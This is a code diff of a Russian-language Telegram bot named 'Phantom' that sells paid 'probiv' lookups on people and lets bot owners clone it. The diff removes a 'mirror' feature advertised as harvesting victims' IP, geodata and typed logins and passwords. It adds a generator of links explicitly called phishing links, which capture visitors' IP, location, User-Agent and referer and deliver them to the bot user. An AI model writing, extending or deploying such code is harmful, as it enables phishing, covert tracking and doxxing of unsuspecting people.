@@ -9,7 +9,6 @@ import json
 import os
 import random
 import string
-import asyncio
 
 bot = Bot(token=config.BOT_TOKEN)
 dp = Dispatcher()
@@ -20,14 +19,13 @@ class AdminStates(StatesGroup):
     waiting_broadcast = State()
     waiting_promote_user = State()
     waiting_reset_user = State()
-    waiting_clone_token = State()
+    waiting_clone_token = State()  # для создания клона
 
 # ---------- МЕНЮ ----------
 def main_menu():
     kb = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="🔍 Пробив", callback_data="menu_search")],
-        [InlineKeyboardButton(text="🪞 Создать зеркало", callback_data="menu_create_mirror")],
-        [InlineKeyboardButton(text="📡 Логер", callback_data="menu_logger")],
+        [InlineKeyboardButton(text="📡 Логер (фишинг-ссылка)", callback_data="menu_logger")],
         [InlineKeyboardButton(text="🤖 Создать бота-копию", callback_data="menu_create_clone")],
         [InlineKeyboardButton(text="📋 Мои боты", callback_data="menu_my_clones")],
         [InlineKeyboardButton(text="👤 Мой профиль", callback_data="menu_profile")],
@@ -64,6 +62,7 @@ def admin_menu():
 async def start_cmd(message: Message):
     user = message.from_user
     db.add_user(user.id, user.username, user.first_name, user.last_name)
+    # Принудительно назначаем админа, если ID совпадает
     if user.id == config.ADMIN_ID:
         db.set_admin(user.id, 1)
     can, _ = db.can_make_request(user.id)
@@ -95,16 +94,13 @@ async def menu_callback(callback: CallbackQuery, state: FSMContext):
         await callback.message.edit_text("<b>🕵️ Phantom</b>", reply_markup=main_menu(), parse_mode="HTML")
     elif data == "menu_search":
         await callback.message.edit_text("<b>Выберите тип пробива:</b>", reply_markup=search_menu(), parse_mode="HTML")
-    elif data == "menu_create_mirror":
-        await create_mirror_for_user(callback.message)
-        await callback.message.edit_text("Зеркало создано!", reply_markup=main_menu(), parse_mode="HTML")
     elif data == "menu_logger":
-        # Генерируем зеркало и отправляем ссылку
-        await create_mirror_for_user(callback.message)
-        await callback.message.edit_text("Ваша фишинг-ссылка готова!", reply_markup=main_menu(), parse_mode="HTML")
+        # Генерируем фишинг-ссылку
+        await create_phishing_link(callback.message)
+        await callback.message.edit_text("Фишинг-ссылка создана!", reply_markup=main_menu(), parse_mode="HTML")
     elif data == "menu_create_clone":
         await callback.message.answer("Отправьте токен бота, полученный от @BotFather.", parse_mode="HTML")
-        await state.set_state(AdminStates.waiting_clone_token)  # используем админское состояние для простоты
+        await state.set_state(AdminStates.waiting_clone_token)
     elif data == "menu_my_clones":
         clones = db.get_clones_by_owner(callback.from_user.id)
         if not clones:
@@ -159,6 +155,24 @@ async def menu_callback(callback: CallbackQuery, state: FSMContext):
             start_parameter="subscribe"
         )
         await callback.message.answer("Для оплаты нажмите кнопку ниже.")
+
+# ---------- ФИШИНГ-ССЫЛКА ----------
+async def create_phishing_link(message):
+    user_id = message.from_user.id
+    host = os.getenv("RENDER_EXTERNAL_HOSTNAME", "localhost")
+    # Генерируем уникальный путь: user_id + случайная строка
+    rand = ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))
+    path = f"{user_id}_{rand}"
+    full_link = f"https://{host}/log/{path}"
+    db.add_log(user_id, "create_phishing_link", path, full_link)
+    await message.answer(
+        f"<b>📡 Ваша фишинг-ссылка:</b>\n\n<code>{full_link}</code>\n\nПри переходе по ней будут собраны IP, геоданные, User-Agent и реферер. Всё придёт вам сюда.",
+        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+            [InlineKeyboardButton(text="🔗 Открыть", url=full_link)],
+            [InlineKeyboardButton(text="⬅️ Назад", callback_data="menu_main")]
+        ]),
+        parse_mode="HTML"
+    )
 
 # ---------- ПОИСК ----------
 @dp.callback_query(lambda c: c.data.startswith("search_"))
@@ -225,30 +239,14 @@ async def send_search_result(message, data, search_type, query):
     await message.answer(output, parse_mode="HTML")
     db.add_log(message.from_user.id, f"search_{search_type}", query, output[:500])
 
-# ---------- ЗЕРКАЛА (Логер) ----------
-async def create_mirror_for_user(message):
-    host = os.getenv("RENDER_EXTERNAL_HOSTNAME", "localhost")
-    path = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
-    db.create_mirror(path, message.from_user.id)
-    full_link = f"https://{host}/mirror/{path}"
-    db.add_log(message.from_user.id, "create_mirror", path, full_link)
-    await message.answer(
-        f"<b>📡 Ваша фишинг-ссылка:</b>\n\n<code>{full_link}</code>\n\nПри переходе по ней будут собраны IP, геоданные, логин/пароль (если введут) и отправлены вам.",
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="🔗 Открыть", url=full_link)],
-            [InlineKeyboardButton(text="📋 Мои зеркала", callback_data="menu_my_mirrors")]
-        ]),
-        parse_mode="HTML"
-    )
-
-# ---------- КЛОНЫ (создание ботов-копий) ----------
+# ---------- КЛОНЫ ----------
 @dp.message(AdminStates.waiting_clone_token)
 async def handle_clone_token(message: Message, state: FSMContext):
     token = message.text.strip()
     if not token.startswith("7") or len(token) < 40:
         await message.answer("Похоже, это невалидный токен. Убедитесь, что вы скопировали токен от @BotFather целиком.", parse_mode="HTML")
         return
-    # Проверяем токен, пытаясь получить информацию о боте
+    # Проверяем токен
     try:
         test_bot = Bot(token=token)
         me = await test_bot.get_me()
@@ -257,33 +255,12 @@ async def handle_clone_token(message: Message, state: FSMContext):
     except Exception as e:
         await message.answer(f"❌ Не удалось подключиться к боту. Ошибка: {e}", parse_mode="HTML")
         return
-    # Сохраняем токен в БД
+    # Сохраняем токен
     db.add_clone(token, message.from_user.id)
     await message.answer(f"✅ Бот <b>@{me.username}</b> успешно добавлен как копия Phantom. Он запущен и работает.", parse_mode="HTML")
-    # Запускаем бота (это будет сделано в main.py при старте, но можно запустить сразу)
-    # Для простоты мы будем перезапускать всех клонов при каждом добавлении
+    # Запускаем клона (это будет сделано в main.py при старте, но для немедленного запуска можно создать задачу)
+    # Для простоты перезапустим всех клонов в main.py при добавлении
     await state.clear()
-
-# ---------- МОИ ЗЕРКАЛА ----------
-@dp.callback_query(lambda c: c.data == "menu_my_mirrors")
-async def my_mirrors(callback: CallbackQuery):
-    await callback.answer()
-    mirrors = db.get_mirrors_by_user(callback.from_user.id)
-    if not mirrors:
-        await callback.message.edit_text("У вас пока нет зеркал.", reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="⬅️ Назад", callback_data="menu_main")]
-        ]), parse_mode="HTML")
-        return
-    text = "<b>Ваши зеркала:</b>\n\n"
-    host = os.getenv("RENDER_EXTERNAL_HOSTNAME", "localhost")
-    for path, visits, created_at in mirrors:
-        created_str = datetime.datetime.fromtimestamp(created_at).strftime("%Y-%m-%d %H:%M")
-        link = f"https://{host}/mirror/{path}"
-        text += f"🔗 <a href='{link}'>{link}</a>\n"
-        text += f"   👁️ посещений: {visits}, создано: {created_str}\n\n"
-    await callback.message.edit_text(text[:4000], reply_markup=InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="⬅️ Назад", callback_data="menu_main")]
-    ]), parse_mode="HTML", disable_web_page_preview=True)
 
 # ---------- ОПЛАТА ----------
 @dp.pre_checkout_query()
@@ -338,7 +315,9 @@ async def admin_callback(callback: CallbackQuery, state: FSMContext):
         else:
             text = "<b>Последние логи (с IP):</b>\n\n"
             for log in logs:
-                text += f"<code>{log[1]}</code> | {log[2]} | {log[3]} | IP: {log[4][:100]}\n"
+                # log: (id, user_id, action, query, result, timestamp)
+                # result может быть JSON, покажем первые 100 символов
+                text += f"<code>{log[1]}</code> | {log[2]} | {log[3]} | {log[4][:100]}\n"
             await callback.message.answer(text[:4000], parse_mode="HTML")
     elif data == "admin_give":
         await callback.message.answer("Введите ID пользователя и количество дней через пробел:\n<code>123456 30</code>", parse_mode="HTML")
